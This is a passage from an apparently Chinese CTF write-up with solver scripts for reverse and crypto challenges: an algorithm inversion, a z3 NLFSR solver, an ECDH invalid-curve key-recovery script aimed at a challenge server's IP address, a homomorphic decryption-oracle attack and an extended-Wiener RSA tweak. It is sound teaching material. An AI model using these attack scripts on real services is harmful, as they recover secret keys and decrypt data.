369 <span class="hljs-keyword">stack</span>[187] = <span class="hljs-keyword">stack</span>[186] - <span class="hljs-keyword">stack</span>[185]
370 <span class="hljs-keyword">stack</span>[187] must be 0
371 <span class="hljs-keyword">stack</span>[188] = <span class="hljs-keyword">table</span>[76]
373 <span class="hljs-keyword">stack</span>[189] = 189
375 <span class="hljs-keyword">stack</span>[190] = <span class="hljs-keyword">stack</span>[189] - <span class="hljs-keyword">stack</span>[188]
376 <span class="hljs-keyword">stack</span>[190] must be 0
377 <span class="hljs-keyword">stack</span>[191] = <span class="hljs-keyword">table</span>[77]
379 <span class="hljs-keyword">stack</span>[192] = 66
381 <span class="hljs-keyword">stack</span>[193] = <span class="hljs-keyword">stack</span>[192] - <span class="hljs-keyword">stack</span>[191]
382 <span class="hljs-keyword">stack</span>[193] must be 0
383 <span class="hljs-keyword">stack</span>[194] = <span class="hljs-keyword">table</span>[78]
385 <span class="hljs-keyword">stack</span>[195] = 138
387 <span class="hljs-keyword">stack</span>[196] = <span class="hljs-keyword">stack</span>[195] - <span class="hljs-keyword">stack</span>[194]
388 <span class="hljs-keyword">stack</span>[196] must be 0
389 <span class="hljs-keyword">stack</span>[197] = <span class="hljs-keyword">table</span>[79]
391 <span class="hljs-keyword">stack</span>[198] = 162
393 <span class="hljs-keyword">stack</span>[199] = <span class="hljs-keyword">stack</span>[198] - <span class="hljs-keyword">stack</span>[197]
394 <span class="hljs-keyword">stack</span>[199] must be 0
395 <span class="hljs-keyword">stack</span>[200] = <span class="hljs-keyword">table</span>[80]
397 <span class="hljs-keyword">stack</span>[201] = 32
399 <span class="hljs-keyword">stack</span>[202] = <span class="hljs-keyword">stack</span>[201] - <span class="hljs-keyword">stack</span>[200]
400 <span class="hljs-keyword">stack</span>[202] must be 0
401 <span class="hljs-keyword">stack</span>[203] = <span class="hljs-keyword">table</span>[81]
403 <span class="hljs-keyword">stack</span>[204] = 151
405 <span class="hljs-keyword">stack</span>[205] = <span class="hljs-keyword">stack</span>[204] - <span class="hljs-keyword">stack</span>[203]
406 <span class="hljs-keyword">stack</span>[205] must be 0
407 <span class="hljs-keyword">stack</span>[206] = <span class="hljs-keyword">table</span>[82]
409 <span class="hljs-keyword">stack</span>[207] = 176
411 <span class="hljs-keyword">stack</span>[208] = <span class="hljs-keyword">stack</span>[207] - <span class="hljs-keyword">stack</span>[206]
412 <span class="hljs-keyword">stack</span>[208] must be 0
413 <span class="hljs-keyword">stack</span>[209] = <span class="hljs-keyword">table</span>[83]
415 <span class="hljs-keyword">stack</span>[210] = 61
417 <span class="hljs-keyword">stack</span>[211] = <span class="hljs-keyword">stack</span>[210] - <span class="hljs-keyword">stack</span>[209]
418 <span class="hljs-keyword">stack</span>[211] must be 0
419 <span class="hljs-keyword">stack</span>[212] = <span class="hljs-keyword">table</span>[84]
421 <span class="hljs-keyword">stack</span>[213] = 135
423 <span class="hljs-keyword">stack</span>[214] = <span class="hljs-keyword">stack</span>[213] - <span class="hljs-keyword">stack</span>[212]
424 <span class="hljs-keyword">stack</span>[214] must be 0
425 <span class="hljs-keyword">stack</span>[215] = <span class="hljs-keyword">table</span>[85]
427 <span class="hljs-keyword">stack</span>[216] = 160
429 <span class="hljs-keyword">stack</span>[217] = <span class="hljs-keyword">stack</span>[216] - <span class="hljs-keyword">stack</span>[215]
430 <span class="hljs-keyword">stack</span>[217] must be 0
431 <span class="hljs-keyword">stack</span>[218] = <span class="hljs-keyword">table</span>[86]
433 <span class="hljs-keyword">stack</span>[219] = 34
435 <span class="hljs-keyword">stack</span>[220] = <span class="hljs-keyword">stack</span>[219] - <span class="hljs-keyword">stack</span>[218]
436 <span class="hljs-keyword">stack</span>[220] must be 0
437 <span class="hljs-keyword">stack</span>[221] = <span class="hljs-keyword">table</span>[87]
439 <span class="hljs-keyword">stack</span>[222] = 149
441 <span class="hljs-keyword">stack</span>[223] = <span class="hljs-keyword">stack</span>[222] - <span class="hljs-keyword">stack</span>[221]
442 <span class="hljs-keyword">stack</span>[223] must be 0
443 <span class="hljs-keyword">stack</span>[224] = <span class="hljs-keyword">table</span>[88]
445 <span class="hljs-keyword">stack</span>[225] = 121
447 <span class="hljs-keyword">stack</span>[226] = <span class="hljs-keyword">stack</span>[225] - <span class="hljs-keyword">stack</span>[224]
448 <span class="hljs-keyword">stack</span>[226] must be 0
449 <span class="hljs-keyword">stack</span>[227] = <span class="hljs-keyword">table</span>[89]
451 <span class="hljs-keyword">stack</span>[228] = 249
453 <span class="hljs-keyword">stack</span>[229] = <span class="hljs-keyword">stack</span>[228] - <span class="hljs-keyword">stack</span>[227]
454 <span class="hljs-keyword">stack</span>[229] must be 0
455 <span class="hljs-keyword">stack</span>[230] = <span class="hljs-keyword">table</span>[90]
457 <span class="hljs-keyword">stack</span>[231] = 65
459 <span class="hljs-keyword">stack</span>[232] = <span class="hljs-keyword">stack</span>[231] - <span class="hljs-keyword">stack</span>[230]
460 <span class="hljs-keyword">stack</span>[232] must be 0
461 <span class="hljs-keyword">stack</span>[233] = <span class="hljs-keyword">table</span>[91]
463 <span class="hljs-keyword">stack</span>[234] = 84
465 <span class="hljs-keyword">stack</span>[235] = <span class="hljs-keyword">stack</span>[234] - <span class="hljs-keyword">stack</span>[233]
466 <span class="hljs-keyword">stack</span>[235] must be 0
467 <span class="hljs-keyword">stack</span>[236] = <span class="hljs-keyword">table</span>[92]
469 <span class="hljs-keyword">stack</span>[237] = 12
471 <span class="hljs-keyword">stack</span>[238] = <span class="hljs-keyword">stack</span>[237] - <span class="hljs-keyword">stack</span>[236]
472 <span class="hljs-keyword">stack</span>[238] must be 0
473 <span class="hljs-keyword">stack</span>[239] = <span class="hljs-keyword">table</span>[93]
475 <span class="hljs-keyword">stack</span>[240] = 109
477 <span class="hljs-keyword">stack</span>[241] = <span class="hljs-keyword">stack</span>[240] - <span class="hljs-keyword">stack</span>[239]
478 <span class="hljs-keyword">stack</span>[241] must be 0</code></pre><p>然后就没什呢好说的了，看算法然后写出逆算法即可</p>
<pre class="hljs"><code>m = [<span class="hljs-number">122</span>,<span class="hljs-number">25</span>,<span class="hljs-number">79</span>,<span class="hljs-number">110</span>,<span class="hljs-number">14</span>,<span class="hljs-number">86</span>,<span class="hljs-number">175</span>,<span class="hljs-number">31</span>,<span class="hljs-number">152</span>,<span class="hljs-number">88</span>,<span class="hljs-number">14</span>,<span class="hljs-number">96</span>,<span class="hljs-number">189</span>,<span class="hljs-number">66</span>,<span class="hljs-number">138</span>,<span class="hljs-number">162</span>,<span class="hljs-number">32</span>,<span class="hljs-number">151</span>,<span class="hljs-number">176</span>,<span class="hljs-number">61</span>,<span class="hljs-number">135</span>,<span class="hljs-number">160</span>,<span class="hljs-number">34</span>,<span class="hljs-number">149</span>,<span class="hljs-number">121</span>,<span class="hljs-number">249</span>,<span class="hljs-number">65</span>,<span class="hljs-number">84</span>,<span class="hljs-number">12</span>,<span class="hljs-number">109</span>]
<span class="hljs-keyword">print</span> len(m)

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>,<span class="hljs-number">3</span>):
    byte0 = m[i] ^ m[i+<span class="hljs-number">2</span>]
    byte0 &amp;= <span class="hljs-number">0xff</span>
    byte1 = m[i+<span class="hljs-number">1</span>] + byte0
    byte1 &amp;= <span class="hljs-number">0xff</span>
    byte2 = m[i+<span class="hljs-number">2</span>] - m[i+<span class="hljs-number">1</span>]
    byte2 &amp;= <span class="hljs-number">0xff</span>
    m[i] = byte0 &amp; <span class="hljs-number">0xff</span>
    m[i+<span class="hljs-number">1</span>] = byte1 &amp; <span class="hljs-number">0xff</span>
    m[i+<span class="hljs-number">2</span>] = byte2 &amp; <span class="hljs-number">0xff</span>
ans = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>):
    ans += chr(m[i])
<span class="hljs-keyword">print</span> ans

base_t = <span class="hljs-string">'0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/='</span>
base_t_l = len(base_t)
sum = <span class="hljs-number">0</span>
flag = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>):
    idx = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(base_t_l):
        <span class="hljs-keyword">if</span> ans[i] == base_t[j]:
            idx = j
            <span class="hljs-keyword">break</span>
    sum = sum * <span class="hljs-number">58</span> + idx
    <span class="hljs-keyword">if</span> (i % <span class="hljs-number">3</span> ==<span class="hljs-number">2</span>):
        flag += binascii.a2b_hex(hex(sum)[<span class="hljs-number">2</span>:])
        <span class="hljs-keyword">print</span> hex(sum)
        sum = <span class="hljs-number">0</span>
<span class="hljs-keyword">print</span> flag
</code></pre><h3 id="little-elves"><a class="header-link" href="#little-elves"></a>little elves</h3>
<p>写个脚本去除下混淆，并把数据提出来。</p>
<p>去除混淆后的程序逻辑伪代码为：</p>
<pre class="hljs"><code>key_list = [
    [],[],[],.........
]    <span class="hljs-comment"># 44 * 44</span>
check_list = [ .... ]   <span class="hljs-comment">#44</span>
flag = <span class="hljs-number">1</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">44</span>):
    key = key_list[i]
    b = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">44</span>):
        in_b = input[j]
        key_b = key[j]
        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
            <span class="hljs-keyword">if</span>( key_b &amp; <span class="hljs-number">1</span> ):
                b ^= in_b
            <span class="hljs-keyword">if</span>( in_b &amp; <span class="hljs-number">0x80</span> ):
                in_b = <span class="hljs-number">2</span> * in_b ^ <span class="hljs-number">0x39</span>
            <span class="hljs-keyword">else</span>:
                in_b = <span class="hljs-number">2</span> * in_b
            key_b &gt;&gt;= <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> b != check_list[i]:
        flag = <span class="hljs-number">0</span></code></pre><p>GF(2^8)矩阵乘法</p>
<h2 id="crypto"><a class="header-link" href="#crypto"></a>crypto</h2>
<h3 id="nlfsr"><a class="header-link" href="#nlfsr"></a>NLFSR</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2b</span><span class="hljs-params">(x)</span>:</span>
    a = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):
        a.append(x % <span class="hljs-number">2</span>)
        x /= <span class="hljs-number">2</span>
    <span class="hljs-keyword">return</span> a

na, nb, nc, nd = <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">13</span>, <span class="hljs-number">6</span>
var_a = [Bool(<span class="hljs-string">"a%d"</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(na)]
var_b = [Bool(<span class="hljs-string">"b%d"</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(nb)]
var_c = [Bool(<span class="hljs-string">"c%d"</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(nc)]
var_d = [Bool(<span class="hljs-string">"d%d"</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(nd)]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_init</span><span class="hljs-params">(num)</span>:</span>
    a = [[<span class="hljs-number">0</span>] * num <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>)]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(min(<span class="hljs-number">32</span>,num)):
        a[i][i] = <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> a

now_a = build_init(na)
now_b = build_init(nb)
now_c = build_init(nc)
now_d = build_init(nd)

<span class="hljs-keyword">with</span> open(<span class="hljs-string">"data"</span>) <span class="hljs-keyword">as</span> f:
    data = list(map(int, f.readline().strip()))

ma, mb, mc, md = map(n2b, (<span class="hljs-number">0x505a1</span>, <span class="hljs-number">0x40f3f</span>, <span class="hljs-number">0x1f02</span>, <span class="hljs-number">0x31</span>))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myxor</span><span class="hljs-params">(a, b)</span>:</span>
    <span class="hljs-comment">#assert len(a)==len(b)</span>
    <span class="hljs-keyword">return</span> [a[i] ^ b[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(a))]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lfsr</span><span class="hljs-params">(a, m)</span>:</span>
    ans = [[] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>)]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">32</span>):
        ans[i] = a[i - <span class="hljs-number">1</span>]
    tmp = [<span class="hljs-number">0</span>] * len(a[<span class="hljs-number">0</span>])
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):
        <span class="hljs-keyword">if</span> m[i] == <span class="hljs-number">1</span>:
            tmp = myxor(tmp, a[i])
    ans[<span class="hljs-number">0</span>] = tmp
    <span class="hljs-keyword">return</span> ans

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">buildxor</span><span class="hljs-params">(var, a)</span>:</span>
    ans = <span class="hljs-keyword">False</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(a)):
        <span class="hljs-keyword">if</span> a[i] == <span class="hljs-number">1</span>:
            ans = Xor(ans, var[i])
    <span class="hljs-keyword">return</span> ans

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">combine</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> now_a, now_b, now_c, now_d, ma, mb, mc, md
    now_a = lfsr(now_a, ma)
    now_b = lfsr(now_b, mb)
    now_c = lfsr(now_c, mc)
    now_d = lfsr(now_d, md)
    a0 = buildxor(var_a, now_a[<span class="hljs-number">0</span>])
    b0 = buildxor(var_b, now_b[<span class="hljs-number">0</span>])
    c0 = buildxor(var_c, now_c[<span class="hljs-number">0</span>])
    d0 = buildxor(var_d, now_d[<span class="hljs-number">0</span>])
    <span class="hljs-keyword">return</span> Or(And(a0, b0), And(Not(b0), Xor(c0, d0)))

solve = Solver()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(min(len(data), <span class="hljs-number">1000</span>)):
    print(i)
    t = combine()
    solve.add(t <span class="hljs-keyword">if</span> data[i]==<span class="hljs-number">1</span> <span class="hljs-keyword">else</span> Not(t))
print(solve)
print(solve.check())
model = solve.model()
print(model)</code></pre><h3 id="ecdh"><a class="header-link" href="#ecdh"></a>ECDH</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> sage.all <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256
<span class="hljs-keyword">import</span> random, string
<span class="hljs-keyword">import</span> codecs
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long

q = <span class="hljs-number">0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd</span>
a = <span class="hljs-number">0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa</span>
b0 = <span class="hljs-number">0x56cbc73d8d2ad00e22f12b930d1d685136357d692fa705dae25c66bee23157b8</span>
field = GF(q)
curve0 = EllipticCurve(field, [a,b0])

primes = []
good_b = []

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_prime</span><span class="hljs-params">(num)</span>:</span>
    <span class="hljs-keyword">global</span> primes
    limit = <span class="hljs-number">100000</span>
    slimit = <span class="hljs-number">100</span>
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        x = trial_division(num, limit)
        <span class="hljs-keyword">if</span> x == num:
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">if</span> x &gt; slimit <span class="hljs-keyword">and</span> x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> primes:
            <span class="hljs-keyword">return</span> x
        num /= x
<span class="hljs-string">"""
prod_primes = 1
while True:
    b = field.random_element()
    curve = EllipticCurve(field, [a,b])
    num = curve.cardinality()
    p = find_prime(num)
    if p != 0:
        primes.append(p)
        good_b.append(b)
        print(b, p)
        prod_primes *= p
        if prod_primes &gt; q:
            break
print(good_b)
print(primes)
"""</span>

good_b = [<span class="hljs-number">6211086815011563067620296699263883972509369396999995302441539455496168622279</span>,
 <span class="hljs-number">98574452757002781783654213495931056883939295347317250205181146329494800676987</span>,
 <span class="hljs-number">87620687935359399908622892998617361658458401834916224453442868851408379289438</span>,
 <span class="hljs-number">65086183749031692453132440274510001138946531322251783223436152949357168702101</span>,
 <span class="hljs-number">46021703287063012097535158344315852578288792152338955276762336204655785703272</span>,
 <span class="hljs-number">55290385593809045586041069311939346961675411126152634019347481812491795288303</span>,
 <span class="hljs-number">87619460816503284587802610883799611592764073598808416496296166011557682550255</span>,
 <span class="hljs-number">20587915430822896519925252084987775347053226113504729908243979761922350194076</span>,
 <span class="hljs-number">8431127641146869895830619497631705992133861543907167102073129469555247540411</span>,
 <span class="hljs-number">72468403213185949431860137197984824137277628176195015746227422957521394676938</span>,
 <span class="hljs-number">62477922485214300600210481151431403396481715852508541015009686763485217204376</span>,
 <span class="hljs-number">2461097140264877184602960042153986475948757748737511275579273536314357774455</span>,
 <span class="hljs-number">52838986369268354399576299386497034405631000959595849861038852829374605724186</span>,
 <span class="hljs-number">86449577338760902484545961462235993087119069610730090900228062112247987488276</span>,
 <span class="hljs-number">93370252582075567605700397171132502753354843346459110919318579649577858331707</span>,
 <span class="hljs-number">33521709848079075367861170558864696456337661027939445036411400565277609897460</span>,
 <span class="hljs-number">36751221215551704172177475140942474141885663956592566340914945275246699332067</span>,
 <span class="hljs-number">35206252668125338121854612073172440870920181137870760968354503478219656581844</span>,
 <span class="hljs-number">30803252885377359748855249043620997912969167347566879519532967182292487052309</span>,
 <span class="hljs-number">71723857802697127056254221655374457039601178429445181744952265211749812716407</span>,
 <span class="hljs-number">84440413960958962355810939609173041967577265336202346661096261207497914589195</span>,
 <span class="hljs-number">99739869036402627989911681764960079998973009086032898863155562454511401401600</span>,
 <span class="hljs-number">12803293455235132143163029402376557032938441696712251760407626953815229385756</span>,
 <span class="hljs-number">99190990366909263866322135175653748341931762174475579305189953098675271672684</span>,
 <span class="hljs-number">17613623221177901583167094460961738253367313920535409663458707894484429207051</span>]
primes = [<span class="hljs-number">2179</span>, <span class="hljs-number">1289</span>, <span class="hljs-number">59999</span>, <span class="hljs-number">30259</span>, <span class="hljs-number">113</span>, <span class="hljs-number">2879</span>, <span class="hljs-number">1181</span>, <span class="hljs-number">967</span>, <span class="hljs-number">659</span>, <span class="hljs-number">101</span>, <span class="hljs-number">5449</span>, <span class="hljs-number">227</span>, <span class="hljs-number">271</span>, <span class="hljs-number">23669</span>, <span class="hljs-number">317</span>, <span class="hljs-number">3989</span>, <span class="hljs-number">547</span>, <span class="hljs-number">167</span>, <span class="hljs-number">751</span>, <span class="hljs-number">12457</span>, <span class="hljs-number">983</span>, <span class="hljs-number">269</span>, <span class="hljs-number">457</span>, <span class="hljs-number">1277</span>, <span class="hljs-number">86599</span>]

n = len(good_b)
curves = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(n):
    curves.append(EllipticCurve(field, [a, good_b[i]]))

points = [(<span class="hljs-number">19507340931189973568970534354346675790660489762463850256460500717283946261836</span>, <span class="hljs-number">93990986852291510741552362898292362153088730070276870172288419312934861060443</span>), (<span class="hljs-number">28054202204080435654185626699590118012041849935670790888142479053885296554769</span>, <span class="hljs-number">65263191418667493074958784939105580722524953377895465589805829613231371260761</span>), (<span class="hljs-number">19570113117206968931041461825359841635154708132893840274912509868663111066055</span>, <span class="hljs-number">34861736386744152249641750097691296936161875795323328010906578876540223102867</span>), (<span class="hljs-number">33388964031225647753658029329629878266463218727954841418700248047371661736053</span>, <span class="hljs-number">90361586139917610370159763883369565805713212527920403273386189235983585562743</span>), (<span class="hljs-number">66700790350207354737852013222385488367498981573233379904437853631717043448547</span>, <span class="hljs-number">53433408083666386534739553623370765372323686554370314300461422960727091694924</span>), (<span class="hljs-number">36281323235605439303424711969604228819253455717300370339472440863583798921747</span>, <span class="hljs-number">89333075334215107563917563532536759593693082972899271521968161088671976288092</span>), (<span class="hljs-number">24898771388008938378671397098037276299001299298558179332046761459119813933208</span>, <span class="hljs-number">60157824174292914357907617012784233148535109635888926712493355114443684410242</span>), (<span class="hljs-number">41024842272459113591038406867847701260219120913143525871455120954725085815388</span>, <span class="hljs-number">58080663589581142504473489403185052460849908517621917171065862560693740117488</span>), (<span class="hljs-number">44877839753880210170426316074475704017688393591895232633465680932056165426108</span>, <span class="hljs-number">16637391968836021868062256428444034583180361666267818812297923545223531374906</span>), (<span class="hljs-number">9213004151061951383151318314265271108777938482780831941654814187659115347886</span>, <span class="hljs-number">11228777849799372233846801614232594742279770274180260153160807304484971904264</span>), (<span class="hljs-number">48643305686563148479162697336870778051714568931350429397807207503680876755497</span>, <span class="hljs-number">11195641711169844792310025421834391460453387017937786699885654091495296207043</span>), (<span class="hljs-number">1698615000299687838648146942270648895141070165499143965557282372482965747112</span>, <span class="hljs-number">92569310096599508172798587722411817818074417408181334875149071535920735447292</span>), (<span class="hljs-number">89935055566882410026353986317893095604898893132013616740671092603082845878572</span>, <span class="hljs-number">43502660097223071441728238468509061422820080712250114528659957352951916779994</span>), (<span class="hljs-number">48056015661830589709097512930877649812778054373210479825115615986276908078753</span>, <span class="hljs-number">19618098018003216997623948377351727960824032255044568182472217742720133385651</span>), (<span class="hljs-number">93761147474070978486072670079787938982982789958802141020754905539581891787306</span>, <span class="hljs-number">88010231672503149200294157470647905088886902144549803873108630549395091840275</span>), (<span class="hljs-number">92020668575688499794016000549051660826892090181832905239230804713279441917958</span>, <span class="hljs-number">30110506624063128411566588628476581431326295832322077660437857357626639718987</span>), (<span class="hljs-number">44809345422891960257530727200370127012697279930443588929057473411421246871992</span>, <span class="hljs-number">88545270496688963328321986899568632277665741441711074441024187438963389363897</span>), (<span class="hljs-number">13076106146633904709359888905193226187967735552055658529027341002932457572814</span>, <span class="hljs-number">80372346494606386901236287105868984286890847036067050266743919277423665456135</span>), (<span class="hljs-number">55907782788450924012146412683706088533171253022693607550089447952215419312846</span>, <span class="hljs-number">3751516562614392695911378044870039330350823342073921223753336327462679673674</span>), (<span class="hljs-number">47051129916073582188659668685945994754626518455721110919136386190138499276471</span>, <span class="hljs-number">86704825096586057708845977585742183545462737899909346286882311991113257296140</span>), (<span class="hljs-number">81621390336051571271375962201675607332094248443293624702225955356975450394838</span>, <span class="hljs-number">62848412712613880537361968249181467640248592602903157605441011622878154021187</span>), (<span class="hljs-number">28068769009810651156082373576237044558982030816550630080563930970321395346474</span>, <span class="hljs-number">19692854947437892925207214399032477726928042246514722730356145177501099769534</span>), (<span class="hljs-number">35948452792200094240506018863073321272868570672393239428399789400279043435798</span>, <span class="hljs-number">76267546729736502626578895970729012855904970704453897303449164923661935193761</span>), (<span class="hljs-number">40433612828564862678329442593693250130220784327522208224488063346825116554334</span>, <span class="hljs-number">20721954396231306197017431006852550862189546642228084462958643733119955101666</span>), (<span class="hljs-number">26739431417888933616685141927426627849471810811576883518571031672580867716174</span>, <span class="hljs-number">43592843242668872950809571417365447079940129342363899108923060420461318436125</span>)]

<span class="hljs-string">"""
for i in range(n):
    print("try",i)
    curve = curves[i]
    m = curve.cardinality()
    assert m%primes[i]==0
    if len(points) &gt; i:
        h = curve(points[i][0], points[i][1])
        assert h.order() == primes[i]
        continue
    while True:
        h = curve.random_element()
        h = (m // primes[i]) * h
        if h.order() == primes[i]:
            break
    points.append((h[0], h[1]))
    print(points)
"""</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">curve_div</span><span class="hljs-params">(pa,pb)</span>:</span>
    ans = <span class="hljs-number">0</span>
    pt = <span class="hljs-number">0</span>*pb
    <span class="hljs-keyword">while</span> pt != pa:
        pt = pt + pb
        ans = ans + <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> ans

context.log_level = <span class="hljs-string">"debug"</span>
rt = remote(<span class="hljs-string">"134.175.225.42"</span>, <span class="hljs-number">8848</span>)
<span class="hljs-comment">#rt = remote("localhost", 8848)</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proof</span><span class="hljs-params">()</span>:</span>
    line = rt.recvline().decode()
    s0 = line[line.find(<span class="hljs-string">'+'</span>)+<span class="hljs-number">1</span>:line.find(<span class="hljs-string">')'</span>)]
    s1 = line[line.find(<span class="hljs-string">'=='</span>)+<span class="hljs-number">3</span>:].strip()
    print(s0,s1,type(s1))
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        s = <span class="hljs-string">''</span>.join(random.choice(string.ascii_letters + string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>))
        <span class="hljs-keyword">if</span> sha256((s+s0).encode()).hexdigest() == s1:
            rt.sendline(s)
            <span class="hljs-keyword">break</span>

proof()
rt.recvuntil(<span class="hljs-string">"are: \n"</span>)
rt.recvline() <span class="hljs-comment"># q</span>
rt.recvline() <span class="hljs-comment"># a</span>
rt.recvline() <span class="hljs-comment"># b</span>
rt.recvline() <span class="hljs-comment"># P</span>
Q = rt.recvline() <span class="hljs-comment"># Q</span>
Q = eval(Q[<span class="hljs-number">3</span>:])
Q = curve0(Q)
print(Q)

rt.sendline(<span class="hljs-string">"0"</span>)
rt.sendline(<span class="hljs-string">"0"</span>)

divs = []

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(n):
    rt.recvuntil(<span class="hljs-string">"choice"</span>)
    rt.sendline(<span class="hljs-string">"Exchange"</span>)
    rt.recvuntil(<span class="hljs-string">"X:"</span>)
    rt.sendline(str(points[i][<span class="hljs-number">0</span>]))
    rt.recvuntil(<span class="hljs-string">"Y:"</span>)
    rt.sendline(str(points[i][<span class="hljs-number">1</span>]))
    rt.recvuntil(<span class="hljs-string">"choice"</span>)
    rt.sendline(<span class="hljs-string">"Encrypt"</span>)
    rt.recvuntil(<span class="hljs-string">"message"</span>)
    rt.sendline(<span class="hljs-string">'ff'</span>*<span class="hljs-number">64</span>)
    rt.recvuntil(<span class="hljs-string">"is:\n"</span>)
    result = rt.recvline().strip()
    result = bytes_to_long(codecs.decode(result, <span class="hljs-string">'hex'</span>))
    result ^= (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">512</span>) - <span class="hljs-number">1</span>
    x = result &gt;&gt; q.bit_length()
    y = result - (x &lt;&lt; q.bit_length())
    curve = curves[i]
    key = curve(x,y)
    h = curve(points[i][<span class="hljs-number">0</span>], points[i][<span class="hljs-number">1</span>])
    d = curve_div(key, h)
    divs.append(d)

secret = CRT_list(divs, primes)
rt.recvuntil(<span class="hljs-string">"choice"</span>)
rt.sendline(<span class="hljs-string">"Backdoor"</span>)
rt.recvuntil(<span class="hljs-string">"secret"</span>)
rt.sendline(str(secret))
print(rt.recvall())</code></pre><h3 id="homomorphic"><a class="header-link" href="#homomorphic"></a>Homomorphic</h3>
<pre class="hljs"><code>rt.recvuntil(<span class="hljs-string">"flag is: \n"</span>)
enc = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">44</span>):
        f1 = eval(rt.recvline())
        f2 = eval(rt.recvline())
        enc.append([f1,f2])

ans = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">44</span>):
        rt.recvuntil(<span class="hljs-string">"choice"</span>)
        rt.sendline(<span class="hljs-string">"Decrypt"</span>)
        c0, c1 = enc[i]
        c0 = (Q(c0) + genError()).list()
        rt.recvuntil(<span class="hljs-string">"c0"</span>)
        rt.sendline(<span class="hljs-string">','</span>.join(map(str, c0)))
        rt.recvuntil(<span class="hljs-string">"c1"</span>)
        rt.sendline(<span class="hljs-string">','</span>.join(map(str, c1)))
        rt.recvuntil(<span class="hljs-string">"index"</span>)
        rt.sendline(<span class="hljs-string">'0'</span>)
        rt.recvuntil(<span class="hljs-string">'result is: \n'</span>)
        a = rt.recvline()
        ans += chr(int(a))
print(ans)</code></pre><h3 id="easyrsa"><a class="header-link" href="#easyrsa"></a>easyRSA</h3>
<p>按照 Extending Wiener’s attack in the presence of many decrypting exponents 的做法 LLL. 论文默认参数出不来, 把 M2 调小到大概 1/4 左右即可:</p>
<pre class="hljs"><code>M1 = int(<span class="hljs-name">sqrt</span>(<span class="hljs-name">N</span>))
M2 = int(<span class="hljs-name">limit*0x1000000000001*N</span>^<span class="hljs-number">0.998</span>)</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>misc</h2>
<h3 id="mc_joinin"><a class="header-link" href="#mc_joinin"></a>mc_joinin</h3>
<p>先用HMCL安装1.12版本的mc</p>
<p>然后找到 .minecraft\versions\1.12\1.12.jar</p>
<p>把里面有关protocl version的地方，都patch成997</p>
<p>然后重新计算hash</p>
<p>imgur.com/a/ZOrErVM</p>
<p>然后LSB 拉一拉 转一转</p>
